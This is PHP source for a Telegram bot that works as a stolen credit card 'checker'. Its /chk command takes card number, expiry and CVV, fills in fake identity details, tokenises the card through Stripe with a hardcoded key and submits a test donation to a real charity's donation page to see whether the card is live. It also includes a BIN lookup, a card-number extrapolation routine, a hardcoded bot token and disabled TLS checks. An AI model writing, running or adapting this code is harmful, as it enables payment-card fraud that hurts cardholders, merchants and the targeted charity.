<?php

error_reporting(0);

header("Cache-Control: no-cache, must-revalidate"); // HTTP/1.1
header("Expires: Sat, 26 Jul 1997 05:00:00 GMT"); // Date in the past
header("Pragma: no-cache");


//-----------------------VARIABLES-------------------------//

//------TOKEN DEL BOT MIKASA ACKERMAN--------//
$token = "5405339405:AAG0kGkeN-8VueVsI2JCLQbHI3wYSnfoG7Y";
$website = "https://api.telegram.org/bot".$token;


$data = file_get_contents("php://input");
$json = json_decode($data, true);
$update = $json["message"];

//---------PERSONAL---------//
$id = $update["from"]["id"];
$name = $update["from"]["first_name"];
$message = $update["text"];
//----------GRUPOS----------//
$id_chat = $update["chat"]["id"];
$id_new = $update["new_chat_member"]["id"];
$grupo = $update["chat"]["title"];
$nuevo = $update["new_chat_member"]["first_name"]. ' '.$update["new_chat_member"]["last_name"];
//----------------------END VARIABLES----------------------//

$user = $update["from"]["username"];
//$message_id = $update["message_id"];
$admin = "D4rkGh0st3";


//-----DATOS DE PRUEBA LOCAL--------//
/*
$id = "1292171163";
$id_chat = "1292171163";
echo "TU CCS: ";
$data = trim(fgets(STDIN));
//$message = "/chk 5148121000661526|08|2026|314";
$message = "/chk ".$data."";
*/
system('rm cookie.txt');
//$message = "/avn 4915116693175150|04|2025|344#4915110695652183|04|2024|754";
//------------END PRUEBA------------//



//--------PRIVACIDAD--------//
if($grupo == "D4rk Security")
{
//PERMITE QUE PUEDA EMVIAR MWNSAJES EN EL GRUPO :3
} else {


if($id == "1292171163")
{
// PERMITE QUE EL DUEÑO ENVIE MENSAJES AL PV DEL BOT :V
} else {

//------MENSAJE AL USUARIO------//
$respuesta = "Hola ".$name." para acceder a este Bot comunicate con\n\n".
'Telegram:  https://t.me/D4rkGh0st3';
sendMessage($id,$respuesta,$token);
//------MENSAJE PERSONAL-------//
$personal = "Hola Rigo, ".$name." Intento Acceder a tu Bot";
sendMessage("1292171163",$personal,$token);
die();
}
}



//-----BIENVENIDA NUEVO INTEGRANTE------//
if(trim($nuevo) != '')
{
$respuesta = "━━━━━━━━━━ × ━━━━━━━━━━\n⁕   𝓜𝓲𝓴𝓪𝓼𝓪 𝓐𝓬𝓴𝓮𝓻𝓶𝓪𝓷  ⁕\n\n     ⚠️ 𝙱𝙸𝙴𝙽𝚅𝙴𝙽𝙸𝙳𝙾 ⚠️\n➭ 𝙸𝙳: ".$id_new."  ✔\n➭ 𝙽𝚘𝚖𝚋𝚛𝚎: ".$nuevo."  ✔\n\n凸-.-凸 ".$grupo." 凸-.-凸\n━━━━━━━━━━ × ━━━━━━━━━━\n     ®ᴿⁱᵍᵒ ᴶⁱᵐᵉ́ⁿᵉᶻッ\n";
sendMessage($id_chat,$respuesta,$token);
}


// Start Commands
if ((strpos($message, "!start") === 0)||(strpos($message, "/start") === 0)||(strpos($message, ".start") === 0))
{
$respuesta = "─ Checker Panel ─\n\n⁕ Registered as ➞ @".$user."\n⁕ Use ➞ /cmds to show available commands.\n⁕ Bot by: Rigo Jimenez\n";
sendMessage($id_chat,$respuesta,$token);
echo "$respuesta";
}

// Cmds Commands
elseif ((strpos($message, "!cmds") === 0)||(strpos($message, "/cmds") === 0)||(strpos($message, ".cmds") === 0))
{
$respuesta = "─ Checker Commands ─\n\n➣ Checker ✔\n⁕ Usage: /chk cc|mm|yy|cvv\n➣ Check Info ✔\n⁕ Usage: /info\n➣ Check BIN Info ✔\n⁕ Usage: /bin xxxxxx\n➣ Contact ➤ @D4rkGh0st3\n";
sendMessage($id_chat,$respuesta,$token);
echo "$respuesta";
}

elseif ((strpos($message, "/avn") === 0)||(strpos($message, "!avn") === 0)||(strpos($message, ".avn") === 0)){
$lista1 = substr($message, 5);
$i1     = explode("|", $lista1);
$i1     = explode("#", $lista1);
$T1    = $i1[0];
$T2    = $i1[1];
//--------------//
//-------AVANZADA----------//
$T1 = "/ext $T1";
$lista1 = substr($T1, 5);
$i1     = explode("|", $lista1);
$cc1    = $i1[0];
//-----------------------------//
$T2 = "/ext $T2";
$lista2 = substr($T2, 5);
$i2     = explode("|", $lista2);
$cc2    = $i2[0];
//-----------------------------//
$com = substr("$cc1", 0, 6);
$con = substr("$cc2", 0, 6);
if($com == "$con" )
{
} else {
echo "Las ccs no son del mismo bin !!!\n";
die();
}
//-----------------------------//
$bin = substr("$cc1", 0, 6);
$cc = substr("$cc1", 0, 8);
$grupo1 = substr("$cc1", 9, 2);
$grupo2 = substr("$cc2", 9, 2);
//-----------------------------//
$sum11 = substr("$grupo1", 0, 1);
$sum12 = substr("$grupo2", 0, 1);
$suma1 = $sum11+$sum12;
//-----------------------------//
$sum21 = substr("$grupo1", 1, 1);
$sum22 = substr("$grupo2", 1, 1);
$suma2 = $sum21+$sum22;
//-----------------------------//
$div1 = $suma1/2;
$div2 = $suma2/2;
//-----------------------------//
$mult1 = $div1*5;
$mult2 = $div2*5;
//-----------------------------//
$gre1 = explode(".", $mult1);
$uno  = $gre1[0];
$gre2 = explode(".", $mult2);
$dos  = $gre2[0];
//-----------------------------//
$fina = $uno+$dos;
echo "AVANZADA: $cc".$fina."xxxxxx\n";
die();

}
elseif ((strpos($message, "/bin") === 0)||(strpos($message, "!bin") === 0)||(strpos($message, ".bin") === 0)){

if($message == "/bin"){
$respuesta = "❗Example: /bin xxxxxx\n❗Example: /bin 479275";
sendMessage($id_chat,$respuesta,$token);
echo "$respuesta";
}


$bin = substr($message, 5);
function GetStr($string, $start, $end){
$str = explode($start, $string);
$str = explode($end, $str[1]);  
return $str[0];
};

$bin = substr("$bin", 0, 6);
$curl = curl_init('https://lookup.binlist.net/'.$bin.'');
curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
$result = curl_exec($curl);
curl_close($curl);
//---------------------------------------------//
$bank = GetStr($result, '"bank": {"name": "', '"');
//$brand = strtoupper(GetStr($result, '"brand":"', '"'));
$emoji = GetStr($result, '"emoji":"', '"');
//$country = strtoupper(GetStr($result, '"name":"', '"'));
$alpha = strtoupper(GetStr($result, '"alpha2":"', '"'));
//$name = "".$country." - ".$alpha." ".$emoji."";
$scheme = strtoupper(GetStr($result, '"scheme":"', '"'));
$type = strtoupper(GetStr($result, '"type":"', '"'));
$currency = GetStr($result, '"currency":"', '"');
//---------------------------------------------//

$curl = curl_init('https://binlist.io/lookup/'.$bin.'');
curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
$content = curl_exec($curl);
curl_close($curl);
$binna = json_decode($content,true);
//---------------------------------------------//
$level = $binna['category'];
if($level == false)
{
$level = "UNKNOWN";
}
$brand = $binna['scheme'];
$country = $binna['country']['name'];
$type = $binna['type'];
$bank = $binna['bank']['name'];
$name = "".$country." - ".$alpha." ".$emoji."";

//if(strpos($json, '"type":"Credit"') !== false){

if($id_chat == "1292171163"){
$tipo = "PREMIUM";
} else {
$tipo = "FREE";
}

$respuesta = "━━━━━━━•⟮ʙɪɴ ᴄʜᴇᴄᴋᴇʀ⟯•━━━━━━━\n➭ 𝙱𝙸𝙽: ".$bin."\n➭ 𝙱𝚁𝙰𝙽𝙳: ".$brand."\n➭ 𝚃𝚈𝙿𝙴: ".$type."\n➭ 𝙻𝙴𝚅𝙴𝙻: ".$level."\n➭ 𝙲𝙾𝚄𝙽𝚃𝚁𝚈: ".$name."\n➭ 𝙲𝚄𝚁𝚁𝙴𝙽𝙲𝚈: ".$currency."\n➭ 𝙱𝙰𝙽𝙺: ".$bank."\n━━━━━━━━━━•⟮ɪɴғᴏ⟯•━━━━━━━━━\n➭ 𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: @".$user." - ".$tipo."\n➭ 𝙲𝚁𝙴𝙰𝚃𝙴𝙳 𝙱𝚈: @".$admin."\n━━━━━━━━━━━•么•━━━━━━━━━━\n";
//sendMessage($id_chat,$respuesta,$token);
sendMessage($id_chat, $respuesta);
echo "$respuesta";
}
//----------------------END CHECK BIN-----------------------//


elseif ((strpos($message, "!info") === 0)||(strpos($message, "/info") === 0))
{
$respuesta = "⁕ ─ 𝗜𝗡𝗙𝗢𝗥𝗠𝗔𝗧𝗜𝗢𝗡 ─ ⁕\nChat ID: ".$id_chat."\nName: ".$firstname."\nUsername: @".$user."";
sendMessage($id_chat,$respuesta,$token);
echo "$respuesta\n";
}
//--------------------------END INFO-------------------------//


elseif ((strpos($message, "!id") === 0)||(strpos($message, "/id") === 0))
{
$respuesta = "Chat ID: $id_chat";
sendMessage($id_chat,$respuesta,$token);
echo "$respuesta\n";
}
//--------------------------END ID--------------------------//


// Checking CC's Commands
if ((strpos($message, "!chk") === 0)||(strpos($message, "/chk") === 0)){
$lista = substr($message, 5);
$i     = explode("|", $lista);
$cc    = $i[0];
$mes   = $i[1];
$ano  = $i[2];
$cvv   = $i[3];
error_reporting(0);
date_default_timezone_set('Asia/Jakarta');
if ($_SERVER['REQUEST_METHOD'] == "POST"){ extract($_POST);
}
elseif ($_SERVER['REQUEST_METHOD'] == "GET"){
extract($_GET);
}
function GetStr($string, $start, $end){
$str = explode($start, $string);
$str = explode($end, $str[1]);
return $str[0];
};
$separa = explode("|", $lista);
$cc = $separa[0];
$mes = $separa[1];
$ano = $separa[2];
$cvv = $separa[3];
////
$bin = substr($lista, 0, 6);
////

$curl = curl_init('https://lookup.binlist.net/'.$bin.'');
curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
$result = curl_exec($curl);
curl_close($curl);
//---------------------------------------------//
$bank = GetStr($result, '"bank": {"name": "', '"');
//$brand = strtoupper(GetStr($result, '"brand":"', '"'));
$emoji = GetStr($result, '"emoji":"', '"');
//$country = strtoupper(GetStr($result, '"name":"', '"'));
$alpha = strtoupper(GetStr($result, '"alpha2":"', '"'));
//$name = "".$country." - ".$alpha." ".$emoji."";
$scheme = strtoupper(GetStr($result, '"scheme":"', '"'));
$type = strtoupper(GetStr($result, '"type":"', '"'));
$currency = GetStr($result, '"currency":"', '"');

//---------------------------------------------//

$curl = curl_init('https://binlist.io/lookup/'.$bin.'');
curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
$content = curl_exec($curl);
curl_close($curl);
$binna = json_decode($content,true);
//---------------------------------------------//
$level = $binna['category'];
if($level == false){
$level = "UNKNOWN";
}
$brand = $binna['scheme'];
$country = $binna['country']['name'];
$type = $binna['type'];
$bank = $binna['bank']['name'];
$count = "".$country." - ".$alpha." ".$emoji."";

//if(strpos($json, '"type":"Credit"') !== false){

if($id_chat == "1292171163"){
$tipo = "PREMIUM";
} else {
$tipo = "FREE";
}


////RANDOM USER//
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://randomuser.me/api/1.2/?nat=us');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$get = curl_exec($ch);
curl_close($ch);

        preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
        $name = $matches1[1][0];
        preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
        $last = $matches1[1][0];
        preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
        $email = $matches1[1][0];
        preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
        $street = $matches1[1][0];
        preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
        $city = $matches1[1][0];
        preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
        $state = $matches1[1][0];
        preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
        $phone = $matches1[1][0];
        preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
        $postcode = $matches1[1][0];

////SACA EL TOKEN//
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2F3d0d0fc67%3B+stripe-js-v3%2F3d0d0fc67&time_on_page=63244&key=pk_live_41FIHoENH2ilJLW1pkGdu3wb&pasted_fields=number');
$result = curl_exec($ch);
curl_close($ch);

$token = trim(strip_tags(getstr($result,'id": "','"')));
$ip = trim(strip_tags(getstr($result,'client_ip": "','"')));

// PRUEBA LAS CCS EN PAGINA DE DONACION//
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://goodbricksapp.com/icsd.org/donate');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'g-recaptcha-response=03ANYolqtrAXy5zIt2AjPl_v86EhHB_0O8YEgRQ73dmNp0E6rS3OaDFJqwYHwDoSLyD6Z9plsGVb3XvVAqEvqVWJTNX-YDYXAx2ynIggYNEIE5ns3byzDEIOJMghcj6qkmnzTyM4nzk3XRnSeqndz8VbvON0ctHxIbblzlqdtAwfNLKyYN3Z4QvcOqK8RmrhIJNInTgDRBAXqo8cCS3hg2xlDTbuzXSS1EV4WAlTE0yIyUVAs27f63DSS4MRZL-jX8ifTCcHmDgX3sKX92atN3k3vI91QTJ8TGmPkcuWTj4xgBnktDyFxQSIPMY2yORw5d90yIDfUHQV62ZAn3TQvZ0l_psLuVhs15xrah2ZGuA-qTBuAhAM64qn8WXaw2YCXQMG1rU4RkUeYm3PvsV0_Yxq9aBzDMC7g6aySQP-1RUw2AA6Ma7yTWvhdwL7tWcs7iy6-5fWF86dIb2tBujmSMzwfr4EdOZ1PD4Q&token='.$token.'&clientIp='.$ip.'&categoryAmount=50&paymentIterations=0&categoryName=funeral+expenses&firstName='.$name.'&lastName='.$last.'&email='.$email.'&customerEmailValidation=&phone='.$phone.'&address=true&addressStreet='.$street.'&addressApt=&addressCity='.$city.'&addressState='.$state.'&addressZipCode='.$postcode.'');
$result = curl_exec($ch);
curl_close($ch);
//_________________________//
$cvc_check = trim(strip_tags(getStr($result,'"cvc_check":"','"')));
$decline_check = trim(strip_tags(getStr($result,'"decline_code":"','"')));
$info = curl_getinfo($ch);
$time = $info['total_time'];
$httpCode = $info['http_code'];
$time = substr($time, 0, 4);

if($cvc_check == false){
$proxy = "LIVE ✅";
}else{
$proxy = "PROXY DEAD ❌";
}

if($id_chat == "1292171163"){
$tipo = "PREMIUM";
} else {
$tipo = "FREE";
}
/////RESPONSE - RESULTADO///
$respo = trim(strip_tags(getStr($result,'"message":"',';')));
$respuesta = "$result\n";
sendMessage($id_chat, $respuesta);

if(stristr($result, 'Your card was declined.')){
$respuesta = "━━━━━━━━•⟮ᴄʜᴀʀɢᴇ⟯•━━━━━━━━\n➭ 𝙲𝙰𝚁𝙳: ".$lista."\n➭ 𝚂𝚃𝙰𝚃𝚄𝚂: DECLINED ❌\n➭ 𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: ".$respo."\n━━━━━━━━•⟮ʙɪɴ ᴅᴀᴛᴀ⟯•━━━━━━━\n➭ 𝙱𝙸𝙽: ".$bin."\n➭ 𝙱𝚁𝙰𝙽𝙳: ".$brand."\n➭ 𝚃𝚈𝙿𝙴: ".$type."\n➭ 𝙻𝙴𝚅𝙴𝙻: ".$level."\n➭ 𝙲𝙾𝚄𝙽𝚃𝚁𝚈: ".$count."\n➭ 𝙱𝙰𝙽𝙺: ".$bank."\n━━━━━━━━━•⟮ɪɴғᴏ⟯•━━━━━━━━━\n➭ 𝙿𝚁𝙾𝚇𝚈: ".$proxy."\n➭ 𝚃𝙸𝙼𝙴 𝚃𝙾𝙾𝙺: ".$time."'Seg\n➭ 𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: @".$user." - ".$tipo."\n➭ 𝙲𝚁𝙴𝙰𝚃𝙴𝙳 𝙱𝚈: @".$admin."\n━━━━━━━━━━•么•━━━━━━━━━━\n";
//sendMessage($id_chat, $respuesta, $token);
sendMessage($id_chat, $respuesta);
echo "$respuesta\n";
}
//-------------------END CHECKER CCS------------------//

else if(isset($message)){
        $respuesta = "Perdon no te he entendido!!!";
        sendMessage($id_chat,$respuesta,$token);

}

}

function sendMessage($chatID, $respuesta) {
        $url = $GLOBALS["website"]."/sendMessage?chat_id=".$chatID."&parse_mode=HTML&text=".urlencode($respuesta);
        file_get_contents($url);
}

/*
//FUNCTION SEND
function sendMessage($chatID, $messaggio, $token,&$k = ''){
    $url = "https://api.telegram.org/bot".$token."/sendMessage?disable_web_page_preview=false&parse_mode=HTML&chat_id=".$chatID;


//        if(isset($k)) {
  //              $url = $url."&reply_markup=".$k;
  //              }


    $url = $url."&text=" . urlencode($messaggio);
    $ch = curl_init();
    $optArray = array(
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => true
    );
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
}*/
?>
